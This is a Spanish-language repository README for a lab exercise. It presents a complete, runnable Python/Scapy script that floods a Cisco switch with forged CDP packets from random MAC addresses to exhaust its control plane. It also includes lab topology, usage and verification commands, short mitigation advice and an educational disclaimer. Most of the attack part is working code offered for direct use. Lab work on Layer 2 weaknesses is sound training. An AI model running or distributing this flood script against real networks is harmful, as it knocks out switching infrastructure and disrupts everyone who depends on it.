# 📁 CDP_DoS_Scapy

## 📌 Descripción

Este repositorio contiene un script desarrollado en Python utilizando la librería Scapy, cuyo objetivo es realizar un ataque de Denegación de Servicio (DoS) al plano de control de un switch Cisco mediante la inyección masiva de paquetes CDP falsos.

El ataque explota el protocolo **Cisco Discovery Protocol (CDP)**, el cual opera en Capa 2 y permite a los dispositivos Cisco intercambiar información de forma automática.

## 🎯 Objetivo del Script

El objetivo del script es:

- ✅ Inundar el switch con paquetes CDP falsificados
- ✅ Generar múltiples vecinos CDP inexistentes
- ✅ Saturar el plano de control del switch
- ✅ Demostrar la falta de autenticación del protocolo CDP

Este ataque es útil para prácticas de seguridad en redes, pentesting interno y análisis de protocolos de Capa 2.

## 🧪 Entorno de Pruebas

- **Plataforma:** PNETLab
- **Sistema atacante:** Kali Linux
- **Dispositivo afectado:** Switch
- **Protocolo atacado:** CDP
- **Capa OSI:** Capa 2

## 🗺️ Topología de Red

![Topología de Red](https://github.com/mariana121319/CDP_DoS_Scapy/assets/1/image1.png)

```
        Router (R1)
            |
        e0/0 | 12.0.0.1
            |
        Gi0/0
        Switch
        |     |
   Gi0/1     Gi0/2
   Win       Kali
12.0.0.20  12.0.0.10
```

## 📡 VLANs utilizadas en el laboratorio

### 🟦 VLAN 10 – LAN Laboratorio

Se configuró una única VLAN para garantizar la comunicación directa entre los hosts y permitir la ejecución de ataques de Capa 2.

#### 📌 Motivo

- ARP es un protocolo de Capa 2
- CDP opera únicamente dentro del mismo dominio de broadcast
- Los ataques MITM y CDP DoS NO atraviesan VLANs

#### 📋 Detalle de la VLAN

| VLAN ID | Nombre | Descripción |
|---------|--------|-------------|
| 10 | Vlan10 | VLAN de laboratorio para pruebas de seguridad |

### 🌐 Direccionamiento IP por VLAN

#### VLAN 10 – 12.0.0.0/24

| Dispositivo | Interfaz | IP |
|-------------|----------|------------|
| Router | e0/0.10 | 12.0.0.1 |
| Switch | VLAN 10 | — |
| Kali Linux | eth0 | 12.0.0.10 |
| Windows | eth0 | 12.0.0.20 |

> ⚠️ **Nota:** El ataque CDP NO requiere IP, ya que funciona a nivel de Capa 2.

## ⚙️ Requisitos

- Kali Linux
- Python 3
- Scapy
- Acceso físico/lógico al switch
- Interfaz conectada directamente al switch

### Instalación de dependencias:

```bash
pip install scapy
```

## ▶️ Uso del Script

```bash
sudo python3 cdp_dos.py
```

Para detener el ataque:

```
CTRL + C
```

## 📄 Script: ScriptCDP.py

```python
from scapy.all import Ether, LLC, SNAP, Raw, sendp, RandMAC
import struct
import random
import time

CDP_MULTICAST = "01:00:0c:cc:cc:cc"
INTERFACE = "eth0"

def generar_checksum(data):
    if len(data) % 2 != 0:
        data += b'\x00'
    s = 0
    for i in range(0, len(data), 2):
        s += (data[i] << 8) + data[i+1]
    s = (s >> 16) + (s & 0xffff)
    s += (s >> 16)
    return (~s) & 0xffff

def tlv(tipo, valor):
    return struct.pack("!HH", tipo, len(valor) + 4) + valor

def crear_cdp():
    device_id = f"SW-{random.randint(100,999)}".encode()
    port_id = b"GigabitEthernet0/1"
    capabilities = struct.pack("!I", 0x01)

    payload = b""
    payload += tlv(0x0001, device_id)
    payload += tlv(0x0003, port_id)
    payload += tlv(0x0004, capabilities)

    version = 0x02
    ttl = random.randint(120, 180)

    header = struct.pack("!BBH", version, ttl, 0x0000)
    checksum = generar_checksum(header + payload)

    return struct.pack("!BBH", version, ttl, checksum) + payload

print("[*] Iniciando ataque CDP DoS")

try:
    while True:
        packet = (
            Ether(src=RandMAC(), dst=CDP_MULTICAST) /
            LLC(dsap=0xaa, ssap=0xaa, ctrl=3) /
            SNAP(OUI=0x00000c, code=0x2000) /
            Raw(load=crear_cdp())
        )
        sendp(packet, iface=INTERFACE, verbose=False)
        time.sleep(random.uniform(0.03, 0.07))
except KeyboardInterrupt:
    print("\n[!] Ataque detenido")
```

## 📸 Evidencia del Ataque

### Topologia
<img width="477" height="453" alt="image" src="https://github.com/user-attachments/assets/e4264a49-f111-4afc-8ee6-8d8403ae25fd" />

### Comando CDP Neighbors

<img width="711" height="409" alt="image" src="https://github.com/user-attachments/assets/2cbc3b5a-d6f4-487b-ac7c-2e0c7e4467ae" />

### Resultado del Ataque

<img width="692" height="425" alt="image" src="https://github.com/user-attachments/assets/e079a7d6-7131-425d-b387-98633acc6436" />

### Ejecución del Script

<img width="439" height="278" alt="image" src="https://github.com/user-attachments/assets/1d89d4fd-57a6-4aba-8e08-26aff4f0bc12" />


## ✔️ Verificación

En el switch:

```
show cdp neighbors
```

**Resultado esperado:**

- Aparición de múltiples vecinos falsos

## 🛡️ Medidas de Mitigación

Deshabilitar CDP en interfaces no necesarias:

```
no cdp enable
```

Otras medidas:

- Usar protocolos alternativos controlados
- Aplicar monitoreo del plano de control
- Limitar tráfico de Capa 2

## ⚠️ Disclaimer

Este script es únicamente para propósitos educativos y de pruebas de seguridad autorizadas. El uso indebido de esta herramienta puede ser ilegal. El autor no se hace responsable del mal uso de este código.

## 📄 Licencia

MIT License
